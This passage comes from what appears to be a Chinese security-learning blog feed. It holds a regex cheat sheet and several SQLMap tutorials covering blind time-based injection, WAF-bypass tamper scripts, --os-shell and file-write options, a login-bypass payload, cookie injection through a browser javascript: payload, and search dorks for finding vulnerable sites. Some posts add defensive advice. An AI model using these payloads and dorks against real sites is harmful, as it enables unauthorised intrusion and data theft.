        <content type="html"><![CDATA[<p>非负整数：^\d+$</p><p>正整数：^[0-9]<em>[1-9][0-9]</em>$</p><p>非正整数：^((-\d+)|(0+))$</p><p>负整数：^-[0-9]<em>[1-9][0-9]</em>$</p><p>整数：^-?\d+$</p><p>非负浮点数：^\d+(.\d+)?$</p><p>正浮点数 : ^((0-9)+.[0-9]<em>[1-9][0-9]</em>)|([0-9]<em>[1-9][0-9]</em>.[0-9]+)|([0-9]<em>[1-9][0-9]</em>)$</p><p>非正浮点数：^((-\d+.\d+)?)|(0+(.0+)?))$</p><p>负浮点数：^(-((正浮点数正则式)))$</p><p>英文字符串：^[A-Za-z]+$</p><p>英文大写串：^[A-Z]+$</p><p>英文小写串：^[a-z]+$</p><p>英文字符数字串：^[A-Za-z0-9]+$</p><p>英数字加下划线串：^\w+$</p><p>E-mail地址：^[\w-]+(.[\w-]+)*@[\w-]+(.[\w-]+)+$</p><p>URL：^[a-zA-Z]+://(\w+(-\w+)<em>)(.(\w+(-\w+)</em>))<em>(\?\s</em>)?$<br> 或：^http:\/\/[A-Za-z0-9]+.[A-Za-z0-9]+[\/=\?%-&amp;_~`@[]\’:+!]<em>([^&lt;&gt;\”\”])</em>$</p><p>邮政编码：^[1-9]\d{5}$</p><p>中文：^[\u0391-\uFFE5]+$</p><p>电话号码：^(((\d{2,3}))|(\d{3}-))?((0\d{2,3})|0\d{2,3}-)?[1-9]\d{6,7}(-\d{1,4})?$</p><p>手机号码：^(((\d{2,3}))|(\d{3}-))?13\d{9}$</p><p>双字节字符(包括汉字在内)：^\x00-\xff</p><p>匹配首尾空格：(^\s<em>)|(\s</em>$)（像vbscript那样的trim函数）</p><p>匹配HTML标记：&lt;(.<em>)&gt;.</em>&lt;\/\1&gt;|&lt;(.*) \/&gt;</p><p>匹配空行：\n[\s| ]*\r</p><p>提取信息中的网络链接：(h|H)(r|R)(e|E)(f|F)  <em>=  </em>(‘|”)?(\w|\|\/|.)+(‘|”|  *|&gt;)?</p><p>提取信息中的邮件地址：\w+([-+.]\w+)<em>@\w+([-.]\w+)</em>.\w+([-.]\w+)*</p><p>提取信息中的图片链接：(s|S)(r|R)(c|C)  <em>=  </em>(‘|”)?(\w|\|\/|.)+(‘|”|  *|&gt;)?</p><p>提取信息中的IP地址：(\d+).(\d+).(\d+).(\d+)</p><p>提取信息中的中国手机号码：(86)<em>0</em>13\d{9}</p><p>提取信息中的中国固定电话号码：((\d{3,4})|\d{3,4}-|\s)?\d{8}</p><p>提取信息中的中国电话号码（包括移动和固定电话）：((\d{3,4})|\d{3,4}-|\s)?\d{7,14}</p><p>提取信息中的中国邮政编码：[1-9]{1}(\d+){5}</p><p>提取信息中的浮点数（即小数）：(-?\d*).?\d+</p><p>提取信息中的任何数字 ：(-?\d*)(.\d+)? </p><p>IP：(\d+).(\d+).(\d+).(\d+)</p><p>电话区号：/^0\d{2,3}$/</p><p>腾讯QQ号：^[1-9]<em>[1-9][0-9]</em>$</p><p>帐号(字母开头，允许5-16字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]{4,15}$</p><p>中文、英文、数字及下划线：^[\u4e00-\u9fa5_a-zA-Z0-9]+$</p><p>匹配中文字符的正则表达式： [\u4e00-\u9fa5]</p><p>匹配双字节字符(包括汉字在内)：[^\x00-\xff]</p><p>匹配空行的正则表达式：\n[\s| ]*\r</p><p>匹配HTML标记的正则表达式：/&lt;(.<em>)&gt;.</em>&lt;\/\1&gt;|&lt;(.*) \/&gt;/</p><p>sql语句：^(select|drop|delete|create|update|insert).*$</p><p>匹配首尾空格的正则表达式：(^\s<em>)|(\s</em>$)</p><p>匹配Email地址的正则表达式：\w+([-+.]\w+)<em>@\w+([-.]\w+)</em>.\w+([-.]\w+)*</p>]]></content>
      
      
      <categories>
          
          <category> Regex </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>请求延迟注入</title>
      <link href="/2019/04/09/qing-qiu-yan-chi-zhu-ru/"/>
      <url>/2019/04/09/qing-qiu-yan-chi-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="请求延迟注入"><a href="#请求延迟注入" class="headerlink" title="请求延迟注入"></a>请求延迟注入</h1><p>延时注入主要是针对页面无变化,无法用布尔真假来判断,无法报错的情况下注入.延迟注入是通过页面返回的时间来判断,不同的Mysql数据库版本,延迟语句不同.</p><p>Mysql &gt;= 5.0可以使用sleep()进行查询<br>    sleep(5)<br>Mysql &lt;5.0 使用benchmark()进行查询<br>    select benchmark(1000,select * from admin);</p><h1 id="请求延迟注入相关参数"><a href="#请求延迟注入相关参数" class="headerlink" title="请求延迟注入相关参数"></a>请求延迟注入相关参数</h1><p><img src="http://m.qpic.cn/psb?/V14KwPpr1dBZ4U/Vf4U1oaMOj2Wcik4bqu9ld.ZeL88dTufcLC2eIFueq0!/b/dD4BAAAAAAAA&amp;bo=gAc4BAAAAAARF5s!&amp;rf=viewer_4" alt=""></p><p>–technique<br>    B,E,Q,U,S,T直接决定了注入类型的改变</p><pre><code>B:布尔盲注E:报错型注入Q:内联查询U:联合查询S:可多语句进行查询的注入T:基于时间的盲注</code></pre><p>–time-sec 60</p><p>–delay 20<br>    HTTP和HTTPS请求之间的延迟</p><p>–safe-freq 20</p><h1 id="请求延迟注入的步骤分析"><a href="#请求延迟注入的步骤分析" class="headerlink" title="请求延迟注入的步骤分析"></a>请求延迟注入的步骤分析</h1><ol><li>-u 指定URL<br>-p 指定对什么参数进行SQLMap扫描.</li><li>根据第一步得到的结果指定参数–technique当使用基于时间的盲注时,时刻使用–time-sec参数设定延时时间(默认5S)</li><li>爆库,爆表</li></ol>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLMap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>绕过WAF防火墙</title>
      <link href="/2019/04/09/rao-guo-waf-fang-huo-qiang/"/>
      <url>/2019/04/09/rao-guo-waf-fang-huo-qiang/</url>
      
        <content type="html"><![CDATA[<h1 id="WAF防火墙"><a href="#WAF防火墙" class="headerlink" title="WAF防火墙"></a>WAF防火墙</h1><p>web application firewall(WAF):web应用防护系统</p><h2 id="WAF防火墙的功能"><a href="#WAF防火墙的功能" class="headerlink" title="WAF防火墙的功能"></a>WAF防火墙的功能</h2><ol><li>支持IP白名单和黑名单功能</li><li>支持URL白名单</li><li>支持User-agent过滤</li><li>支持CC攻击防护</li><li>支持Cookie过滤</li><li>支持URL过滤</li><li>支持URL参数过滤</li><li>支持日志记录</li></ol><h2 id="WAF防火墙和网络防火墙"><a href="#WAF防火墙和网络防火墙" class="headerlink" title="WAF防火墙和网络防火墙"></a>WAF防火墙和网络防火墙</h2><p>区别</p><p>网络防火墙作为网络访问控制设备,主要工作在OSI模型的三层四层基于IP报文进行检测.只是对端口做限制对TCP协议进行封堵</p><p>WAF防火墙能在应用层理解分析HTTP会话,因此能有效的防止各类应用层的攻击,同时他向下兼容,具备网络防火墙的功能.</p><h1 id="绕过WAF防火墙的脚本"><a href="#绕过WAF防火墙的脚本" class="headerlink" title="绕过WAF防火墙的脚本"></a>绕过WAF防火墙的脚本</h1><ol><li><p>apostrophemask.py 用UTF-8全角字符替换单引号字符</p></li><li><p>apostrophenullencode.py 用非法双字节unicode字符替换单引号字符</p></li><li><p>appendnullbyte.py 在payload末尾添加空字符编码</p></li><li><p>base64encode.py 对给定的payload全部字符使用Base64编码</p></li><li><p>between.py 分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”</p></li><li><p>bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”</p></li><li><p>chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</p></li><li><p>charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）</p></li><li><p>charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）</p></li><li><p>concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例</p></li><li><p>equaltolike.py 用“LIKE”运算符替换全部等于号“=”</p></li><li><p>greatest.py 用“GREATEST”函数替换大于号“&gt;”</p></li><li><p>halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释</p></li><li><p>ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例</p></li><li><p>lowercase.py 用小写值替换每个关键字字符</p></li><li><p>modsecurityversioned.py 用注释包围完整的查询</p></li><li><p>modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询</p></li><li><p>multiplespaces.py 在SQL关键字周围添加多个空格</p></li><li><p>nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器</p></li><li><p>overlongutf8.py 转换给定的payload当中的所有字符</p></li><li><p>percentage.py 在每个字符之前添加一个百分号</p></li><li><p>randomcase.py 随机转换每个关键字字符的大小写</p></li><li><p>randomcomments.py 向SQL关键字中插入随机注释</p></li><li><p>securesphere.py 添加经过特殊构造的字符串</p></li><li><p>sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs</p></li><li><p>space2comment.py 用“/**/”替换空格符</p></li><li><p>space2dash.py 用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符</p></li><li><p>space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</p></li><li><p>space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</p></li><li><p>space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</p></li><li><p>space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符</p></li><li><p>space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</p></li><li><p>space2mysqldash.py 用破折号注释符“–”其次是一个换行符替换空格符</p></li><li><p>space2plus.py 用加号“+”替换空格符</p></li><li><p>space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</p></li><li><p>unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”</p></li><li><p>unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符</p></li><li><p>varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF</p></li><li><p>versionedkeywords.py 用MySQL注释包围每个非函数关键字</p></li><li><p>versionedmorekeywords.py 用MySQL注释包围每个关键字</p></li><li><p>xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</p></li></ol><h1 id="步骤解析"><a href="#步骤解析" class="headerlink" title="步骤解析"></a>步骤解析</h1><h2 id="确认WAF的三种方式"><a href="#确认WAF的三种方式" class="headerlink" title="确认WAF的三种方式"></a>确认WAF的三种方式</h2><ol><li><p>sqlmap命令:<br> sqlmap -u {目标URL} –threads=10 –identify-waf  # 首选<br> sqlmap -u {目标URL} –threads=10 –check-waf        # 备选</p></li><li><p>使用Burpsuite</p></li><li><p>使用Python脚本进行绕过</p><p> sqlmap -u {目标URL} –dbs –batch –flush -session –tamper=脚本名</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLMap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>常规伪静态注入</title>
      <link href="/2019/04/09/chang-gui-wei-jing-tai-zhu-ru/"/>
      <url>/2019/04/09/chang-gui-wei-jing-tai-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="伪静态的定义"><a href="#伪静态的定义" class="headerlink" title="伪静态的定义"></a>伪静态的定义</h1><p>伪静态主要是为了隐藏传递的参数名,伪静态只是一种URL重写的手段,既然能接收参数的输入,所以并不能防止SQL注入.</p><p><a href="http://www.xxx.com/xxx/xxx.html" target="_blank" rel="noopener">www.xxx.com/xxx/xxx.html</a></p><p>真静态与伪静态的区别</p><p>真静态的使用会大大减轻数据库频繁读写的压力,缺点是不利于数据更新.</p><p>伪静态实际上是一个动态页面,只是在URL上与静态页面不同,伪静态有利于SEO优化.</p><h2 id="伪静态生成的两种方式"><a href="#伪静态生成的两种方式" class="headerlink" title="伪静态生成的两种方式"></a>伪静态生成的两种方式</h2><p>框架性伪静态</p><pre><code>如果整个网站的URL都是一样的,那么就一定是框架性伪静态</code></pre><p>利用组件把ASP的后缀名改为HTM</p><pre><code>主要利用一个组件强制性的将ASP文件的后缀名显示为HTM.</code></pre><p>在SQL注入的防御中,伪静态虽然起到了一定作用,但是并不能完全防御SQL注入.</p><h2 id="伪静态的优缺点"><a href="#伪静态的优缺点" class="headerlink" title="伪静态的优缺点"></a>伪静态的优缺点</h2><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><ol><li>方便搜索引擎搜索</li><li>提高用户对网页的信任度</li><li>网站所用的程序语言不易被发现</li></ol><h2 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h2><ol><li>CPU占有量上升</li><li>网站承受力低</li><li>王爷打开慢</li><li>打量的重复页面</li><li>需要服务器支持</li><li>造成真静态页面无法访问</li></ol><h2 id="使用sqlmap进行伪静态注入"><a href="#使用sqlmap进行伪静态注入" class="headerlink" title="使用sqlmap进行伪静态注入"></a>使用sqlmap进行伪静态注入</h2><p>使用sqlmap进行伪静态注入的时候需要在伪静态url的.html前加一个*号</p><p><strong>如何判断网站是否为伪静态</strong></p><p>进入网站之后F12打开控制台输入document.lastModified,多次运行命令之后查看时间是否相同.</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLMap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>交互式写Shell及命令执行</title>
      <link href="/2019/04/09/jiao-hu-shi-xie-shell-ji-ming-ling-zhi-xing/"/>
      <url>/2019/04/09/jiao-hu-shi-xie-shell-ji-ming-ling-zhi-xing/</url>
      
        <content type="html"><![CDATA[<h1 id="交互式Shell"><a href="#交互式Shell" class="headerlink" title="交互式Shell"></a>交互式Shell</h1><ul><li>–sqlmap-shell      进入Shell环境</li><li>–os-cmd=ipconfig   执行系统命令</li><li>–os-shell          模拟shell输入</li><li>–file-read         读取数据库服务器文件系统文件</li><li>–file-write        向数据库服务器的文件系统上传文件</li><li>–file-dest         向数据库服务器的文件系统上传文件</li><li>–reg-read          读取Windows注册表键值</li><li>–reg-add           写入Windows注册表键值</li><li>–reg-del           删除Windows注册表键值</li><li>–reg-key           注册表辅助选项</li><li>–reg-value         注册表辅助选项</li><li>–reg-data         注册表辅助选项</li><li>–reg-type         注册表辅助选项</li></ul><p>执行任意操作的命令参数<br>    当后端DBMS为Mysql,SQLServer并且当前会话用户拥有对数据库特定功能和相关架构特性的利用权限时,SQLMap能够在数据库所在服务器的操作系统上运行任意的命令<br>    Mysql—&gt;sys_exec()和sys_eval()<br>    SQLServer—&gt;xp_cmdshell</p><p>使用原理</p><pre><code>通过SQLMap以及SQLMap的--os-shell参数扫描-u所对应的网站存在上传页面,上传一句话木马,反弹shell交互式Shell的权限=WEB应用的权限</code></pre><h1 id="如何防范SQLMap交互式写shell及命令执行"><a href="#如何防范SQLMap交互式写shell及命令执行" class="headerlink" title="如何防范SQLMap交互式写shell及命令执行"></a>如何防范SQLMap交互式写shell及命令执行</h1><p>PHP:</p><ol><li>escapeshellarg()</li><li>escapeshellcmd()</li></ol>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLMap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SQLMap简介</title>
      <link href="/2019/04/09/sqlmap-jian-jie/"/>
      <url>/2019/04/09/sqlmap-jian-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="SQLMap参数说明"><a href="#SQLMap参数说明" class="headerlink" title="SQLMap参数说明"></a>SQLMap参数说明</h1><p>-v<br>    输出级别</p><pre><code>0:只显示错误信息和关键信息1:同时显示普通信息和警告信息(默认)2:同时显示debug信息3:同时显示注入使用的攻击载荷4:同时显示HTTP请求5:同时显示HTTP请求头6:同时显示HTTP相应体</code></pre><p>-d<br>    直接连接数据库</p><p>-u<br>    指定目标URL</p><pre><code>Demo:    python sqlmap.py -u &quot;http://192.168.1.1:8080/user.php?id=0&quot;</code></pre><p>-method</p><pre><code>指定HTTP请求方法Demo:    -method=post</code></pre><p>-data</p><pre><code>该参数指定的数据会被作为POST数据提交,sqlmap也会检测该参数指定数据是否存在sql注入漏洞Demo:    python sqlmap.py -u &#39;http://192.168.1.1:8080/user.php&#39; --data=&quot;id=0&amp;name=user&quot;</code></pre><p>-para-del</p><pre><code>指定POST请求数据的分隔符默认的分隔符是&quot;&amp;&quot;,可以使用-param-del指定其他的分隔符</code></pre><p>-random-agent</p><pre><code>设置随机请求头</code></pre><p>-Host</p><pre><code>手动指定Http头的HOST值</code></pre><p>-Referer</p><pre><code>手动指定HTTP头重的Referer的值</code></pre><p>-cookie</p><pre><code>某些网站需要cookie才能够访问,这个参数可以用来指定Cookie值Demo:python sqlmap.py -u &quot;http://192.168.1.1:8080/user.php&quot; --cookie &quot;浏览器中的cookie值&quot;</code></pre><p>-drop-set-cookie</p><pre><code>若浏览器响应头中有&quot;set-cookie&quot;,sqlmap会自动设置&quot;set-cookie&quot;,设置的cookie,并对这些cookie进行检测,若不想让sqlmap这样做,添加参数&quot;drop-set-cookie&quot;即可,这样sqlmap就会忽略&quot;set-cookie&quot;</code></pre><p>-o<br>    优化SQLMap的性能<br>    此参数默认会优化三个参数<br>    -keep-alive(HTTP长链接)<br>    -null-connection(HTTP空链接)<br>    -threads=3(HTTP并发)</p><p>-p<br>    注入相关的参数,用于指定要测试的参数,定制攻击载荷和选择篡改脚本</p><pre><code>Demo    只测试id和user-agent    -p &quot;id,user-agent&quot;</code></pre><p>-skip</p><pre><code>不想测试某些参数Demo    不想测试user-agent,referer    --skip=&quot;user-agent,referer&quot;</code></pre><p>-dbms</p><pre><code>指定数据库管理系统搭配fingerprint可以对数据库进行指纹识别Demo    -dbms 数据库名Mysql和MSSQLServer指定的方法    --dbms Mysql </code></pre><p>-os</p><pre><code>指定运行数据库的操作系统,默认情况下SQLMap会自动扫描运行数据库的操作系统,如果不是非常确定的情况下,还是让SQLMap自己扫描会更好些</code></pre><p>– level<br>    Polyload等级</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLMap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>POST登陆注入</title>
      <link href="/2019/04/09/post-deng-lu-zhu-ru/"/>
      <url>/2019/04/09/post-deng-lu-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="POST注入原理"><a href="#POST注入原理" class="headerlink" title="POST注入原理"></a>POST注入原理</h1><p><img src="https://m.qpic.cn/psb?/V14KwPpr1dBZ4U/gq4moYHgoXfw4kIIRqXSnclRsv1TXH1kuAs3MTbezsI!/b/dFQBAAAAAAAA&amp;bo=gAc4BAAAAAARB4s!&amp;rf=viewer_4" alt=""><br><img src="http://m.qpic.cn/psb?/V14KwPpr1dBZ4U/KEKMXu61rgVpMd.J9fIgYegbgCWuiy3TNK54YPy7AEw!/b/dL8AAAAAAAAA&amp;bo=gAc4BAAAAAARF5s!&amp;rf=viewer_4" alt=""></p><h1 id="POST注入的两个参数"><a href="#POST注入的两个参数" class="headerlink" title="POST注入的两个参数"></a>POST注入的两个参数</h1><p>-r 从文件中加载HTTP请求(BP抓包后保存为文件,使用sqlmap的-r读取文件)</p><p>–forms 自动获取form表单测试(常用)</p><h1 id="POST注入的三种方法"><a href="#POST注入的三种方法" class="headerlink" title="POST注入的三种方法"></a>POST注入的三种方法</h1><ol><li>利用Burpsuite抓包,然后使用sqlmap -r 来进行检测注入,利用Burpsuite抓包之后保存为Txt文件,然后利用sqlmap -r xxx.txt进行注入</li><li>直接使用sqlmap输入命令,sqlmap -u “xxx.com” –forms,sqlmap会自动获取POST包,从而进行注入</li><li>sqlmap -u “xxx.com” –data “标签名=数据1&amp;标签名=数据2&amp;标签名=数据3”</li></ol><h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><p>admin’ or ‘1’=’1 #</p><h1 id="如何防止POST注入"><a href="#如何防止POST注入" class="headerlink" title="如何防止POST注入"></a>如何防止POST注入</h1><p><img src="http://m.qpic.cn/psb?/V14KwPpr1dBZ4U/qW9o75pW0bq*BDfHll8qURntOL36C2F5Jwrog2zWJ00!/b/dFQBAAAAAAAA&amp;bo=gAc4BAAAAAARF5s!&amp;rf=viewer_4" alt=""><br><img src="http://m.qpic.cn/psb?/V14KwPpr1dBZ4U/0GXtwtH4.BH9tKNL7bjgM*2qLKIb*PYHOIOVfp7mlw8!/b/dL4AAAAAAAAA&amp;bo=gAc4BAAAAAARF5s!&amp;rf=viewer_4" alt=""><br><img src="http://m.qpic.cn/psb?/V14KwPpr1dBZ4U/h.UhO*iGO3n0.3diBzfzQcwpC36iF5rUkVfWMsFFhfM!/b/dLYAAAAAAAAA&amp;bo=gAc4BAAAAAARF5s!&amp;rf=viewer_4" alt=""><br><img src="http://m.qpic.cn/psb?/V14KwPpr1dBZ4U/KTWvIuydXXyxuaNagmucaC7Ywp8eXOOpieoCHPyVWYc!/b/dMAAAAAAAAAA&amp;bo=gAc4BAAAAAARF5s!&amp;rf=viewer_4" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLMap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Mysql数据库注入</title>
      <link href="/2019/04/09/mysql-shu-ju-ku-zhu-ru/"/>
      <url>/2019/04/09/mysql-shu-ju-ku-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="Mysql数据库背景知识"><a href="#Mysql数据库背景知识" class="headerlink" title="Mysql数据库背景知识"></a>Mysql数据库背景知识</h1><p>Mysql自带4个数据库</p><ol><li>information_schema<br> 访问数据库元数据的方式</li><li>mysql<br> 核心数据库,负责存储Mysql自己需要使用的控制和管理信息</li><li>performance_schema<br> 性能优化引擎</li><li>test<br> 测试数据库</li></ol><h2 id="Infomation-schema"><a href="#Infomation-schema" class="headerlink" title="Infomation_schema"></a>Infomation_schema</h2><p>此数据库中保存着关于Mysql服务器所维护的所有其他数据库的信息.</p><h1 id="防止SQL注入的解决方法"><a href="#防止SQL注入的解决方法" class="headerlink" title="防止SQL注入的解决方法"></a>防止SQL注入的解决方法</h1><ol><li><p>magic_quotes_gpc函数<br> magin_quotes_gpc = On   开启状态会对单引号,双引号,反斜线等字符进行转义<br> magin_quotes_gpc = Off  关闭状态需要调用addslashes()函数进行转义</p></li><li><p>mysql_real_escape_strign()<br> 成功 返回被转义的字符串</p></li><li><p>使用SQL语句预编译</p><p> String sql = “select username,password from user where username = ? and password = ?;”<br> PreparedStatement ps = connection.prepareStatement(sql);<br> ps.setString(1,username);<br> ps.setString(2.password);<br> ps.executeQuery();</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLMap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Cookie注入</title>
      <link href="/2019/04/09/cookie-zhu-ru/"/>
      <url>/2019/04/09/cookie-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是Cookie"><a href="#什么是Cookie" class="headerlink" title="什么是Cookie"></a>什么是Cookie</h1><p>Cookie是指某些网站为了辨别用户的身份,进行session跟踪而存储在用户本地终端上的数据(通常经过加密)</p><p>Cookie注入是SQL注入的一种方式</p><p>Cookie:接受用户数据,验证用户的凭据,存储在本地电脑上</p><p>Session: 验证用户数据,存储在服务器端</p><p>利用范围:<br>    cookie</p><pre><code>    cookie主要利用在中小企业网站Session    主要利用在银行,金融类网站</code></pre><p>说法:<br>    盗取Cookie      –&gt; √<br>    盗取Session     –&gt; ×<br>    劫持session     –&gt; √</p><h1 id="Cookie注入的条件"><a href="#Cookie注入的条件" class="headerlink" title="Cookie注入的条件"></a>Cookie注入的条件</h1><ol><li>程序对get和post提交方式进行了过滤,但是未对Cookie提交的数据进行过滤</li><li>在条件1的基础上需要对程序对提交数据获取方式是直接request(“xxx”)的方式,用request这个方法的时候获取的参数是url后面的参数也可以是cookie里面的参数.</li></ol><h1 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h1><h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><ol><li>寻找形如”.asp?id=xx”类的带参数URL</li><li>去掉后面的id==”xx”查看页面是否显示正常.</li><li>清空浏览器地址栏,输入”javascript:alert(document.cookie=”id=”+escape(“xx”));”</li><li>重复上面的步骤,将常规SQL注入中的判断语句带入上面的URL中<br> “javascript:alert(document.cookie=”id=”+escape(“xx and 1=1”));”</li><li>使用常规注入语句进行注入即可</li></ol><p><strong>escape(string):对字符串进行编码</strong></p><h2 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h2><h3 id="获取浏览器在网站上的Cookie"><a href="#获取浏览器在网站上的Cookie" class="headerlink" title="获取浏览器在网站上的Cookie"></a>获取浏览器在网站上的Cookie</h3><p>从控制台代码看Cookie,浏览器F12打开在控制台输入<strong>document.cookie</strong>来获取当前网站的Cookie</p><p><img src="http://m.qpic.cn/psb?/V14KwPpr1dBZ4U/RgO5wtlgai4KY6nUilctgWPTasmG4TTfx*r89ERjXs8!/b/dMAAAAAAAAAA&amp;bo=vgaWAQAAAAADFx0!&amp;rf=viewer_4" alt=""></p><h3 id="使用BurpSuite进行抓包改包获取Cookie然后再用sqlmap进行Cookie注入"><a href="#使用BurpSuite进行抓包改包获取Cookie然后再用sqlmap进行Cookie注入" class="headerlink" title="使用BurpSuite进行抓包改包获取Cookie然后再用sqlmap进行Cookie注入"></a>使用BurpSuite进行抓包改包获取Cookie然后再用sqlmap进行Cookie注入</h3><p><img src="https://m.qpic.cn/psb?/V14KwPpr1dBZ4U/wsK5XilHd1EfPeWSPD4YOFJeEExo0yAMSmjRryoX17U!/b/dL8AAAAAAAAA&amp;bo=eAOVAgAAAAADB84!&amp;rf=viewer_4" alt=""></p><h3 id="使用SQLMap获取数据库信息"><a href="#使用SQLMap获取数据库信息" class="headerlink" title="使用SQLMap获取数据库信息"></a>使用SQLMap获取数据库信息</h3><ol><li>–cookie “Cookie值”      指定网页的cookie   </li><li>–current-db             获取当前网页的库名</li><li>-D “数据库名” –tables       获取数据库的表名</li><li>-D “数据库名” -T “表名” –columns        获取表中的字段</li><li>-D “数据库名” -T “表名” -C “列名” –dump     获取字段的值</li></ol><p><img src="http://m.qpic.cn/psb?/V14KwPpr1dBZ4U/Ti4XVfvYHPH6dnCsjIRNBTn44ZCAv.IMb*rSFJXIMg0!/b/dFMBAAAAAAAA&amp;bo=PgUmAgAAAAADFy0!&amp;rf=viewer_4" alt=""></p><h1 id="如何防范Cookie注入"><a href="#如何防范Cookie注入" class="headerlink" title="如何防范Cookie注入"></a>如何防范Cookie注入</h1><ol><li>不能在Cookie中保存敏感信息,比如用户名和密码</li><li>对从客户端取得的Cookie信息进行严格的校验.</li><li>记录非法Cookie</li><li>使用SSL/TLS来传递Cookie信息</li><li>在获取客户端提交的数据时指明数据提交的方式</li></ol><h1 id="如何寻找Cookie注入的网站"><a href="#如何寻找Cookie注入的网站" class="headerlink" title="如何寻找Cookie注入的网站"></a>如何寻找Cookie注入的网站</h1><pre><code>inurl: asp?id=inurl:login.asp chinainurl:login.asp Taiwan</code></pre>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLMap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ScrapyCrawlSpider爬取1药网</title>
      <link href="/2019/03/26/scrapycrawlspider-pa-qu-1-yao-wang/"/>
      <url>/2019/03/26/scrapycrawlspider-pa-qu-1-yao-wang/</url>
      
        <content type="html"><![CDATA[<h1 id="数据展示"><a href="#数据展示" class="headerlink" title="数据展示"></a>数据展示</h1><p><img src="https://m.qpic.cn/psb?/V14KwPpr1dBZ4U/kgYVtRgZpwwkvBp40gj0UfBcmFZy4LVEbS3EAodSyBM!/b/dLgAAAAAAAAA&amp;bo=LAULAgAAAAADBwI!&amp;rf=viewer_4" alt=""></p><h1 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h1><p>利用Scrapy-splash完成JavaScript渲染<br>利用Scrapyd将scrapy项目部署到爬虫服务器</p><h1 id="网站分析"><a href="#网站分析" class="headerlink" title="网站分析"></a>网站分析</h1><p><img src="http://m.qpic.cn/psb?/V14KwPpr1dBZ4U/SO3BCR4P7DDm33fvJh.H05KbKBvTcK*opMDbVg0X2iE!/b/dLYAAAAAAAAA&amp;bo=KwYMAwAAAAADV1A!&amp;rf=viewer_4" alt=""></p><p>网站首页中有各种药品分类,打开分类页面我们可以看到各种的药品分类信息,分析它的URL规则,</p><p><img src="http://m.qpic.cn/psb?/V14KwPpr1dBZ4U/X7751LPjPh8RuyH3Vnk2C9RLuG5GViketEkyIMA8cHc!/b/dL8AAAAAAAAA&amp;bo=PgdlAwAAAAADJ10!&amp;rf=viewer_4" alt=""></p><pre><code>https://www.111.com.cn/categories/953785-j1https://www.111.com.cn/categories/953787-j1https://www.111.com.cn/categories/956104-j1</code></pre><p>编写正则<br>    categories/\d{6}-j\d</p><p>药品分类中有药品信息的URL</p><p><img src="http://m.qpic.cn/psb?/V14KwPpr1dBZ4U/dHOaMY2smRCMgJHMVHr.GGC2K6CbLNZSQkkQq16J3fk!/b/dLYAAAAAAAAA&amp;bo=6AbnAwAAAAADNxg!&amp;rf=viewer_4" 